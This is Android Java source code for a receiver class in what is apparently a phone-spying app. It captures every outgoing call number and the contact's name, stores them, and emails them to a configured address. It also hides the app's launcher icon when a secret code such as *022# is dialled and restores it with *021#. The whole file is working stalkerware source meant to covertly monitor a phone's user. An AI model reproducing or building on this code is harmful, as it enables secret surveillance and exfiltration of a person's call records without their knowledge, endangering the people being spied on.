package com.example.remote;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.StrictMode;
import android.provider.ContactsContract.PhoneLookup;
import android.util.Log;

public class OutgoingReceiver extends BroadcastReceiver {

    Context cx;
    static String contactName = "";
    SharedPreferences my;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub
        StrictMode.enableDefaults();
        cx = context;
        String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        SharedPreferences rec = context.getSharedPreferences("cal_out", 0);
        my = context.getSharedPreferences("SPY", 0);
        if (number.equals(my.getString("unhide", "*021#"))) {
            PackageManager pm = context.getApplicationContext().getPackageManager();
            pm.setComponentEnabledSetting(new ComponentName(context, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        } else if (number.equals(my.getString("hide", "*022#"))) {
            HideApp();
        } else {
            getContactName(context, number);
            rec.edit().putString("c_n", number + contactName).commit();
            if (my.getBoolean("mail_call_ch", false) && !my.getString("mail_call_ed", "").equals("")) {
                ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo networkInfo = manager.getActiveNetworkInfo();
                if (!(networkInfo == null || !networkInfo.isConnected() || !networkInfo.isAvailable())) {
                    try {
                        String toEmails = my.getString("mail_call_ed", "");
                        String emailBody = "TAMAS GEREFTE SHODE\n" + number + contactName + "";
                        sendMail s = new sendMail();
                        s.sendAccelerationData(emailBody, toEmails);
                    } catch (Exception e) {
                        Log.e("SendMail", e.getMessage(), e);
                    }

                } else {
                    String a = rec.getString("call_num_out", "");
                    rec.edit().putString("call_num_out", a + number + contactName + "\n").commit();
                }

            }
        }
    }

    public void HideApp() {
        Intent localIntent = new Intent(cx.getApplicationContext(), CheckPass.class);
        cx.getApplicationContext().startService(localIntent);
        cx.getPackageManager().setComponentEnabledSetting(new ComponentName(cx, MainActivity.class), 2, 1);
    }

    public static void getContactName(Context context, String phoneNumber) {

        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri, new String[]{PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
        } else if (cursor.moveToFirst()) {
            contactName = "(" + cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME)) + ")";
        } else if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }

    }

}